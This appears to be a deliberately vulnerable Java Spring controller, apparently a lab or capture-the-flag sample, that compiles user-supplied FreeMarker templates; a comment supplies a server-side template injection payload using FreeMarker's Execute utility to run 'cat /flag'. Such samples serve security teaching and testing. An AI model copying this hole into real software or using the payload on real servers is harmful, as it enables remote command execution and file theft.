import freemarker.template.*;
import java.io.*;
import org.springframework.web.bind.annotation.*;

@RestController
public class GreetingController {
    private final Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);

    // Vuln: Freemarker compila una plantilla que viene del usuario
    @PostMapping("/greeting")
    public String greeting(@RequestParam String template) throws Exception {
        Template t = new Template("user", new StringReader(template), cfg);
        StringWriter out = new StringWriter();
        t.process(java.util.Map.of("user", "alice"), out);
        return out.toString();
        // template = <#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
    }
}
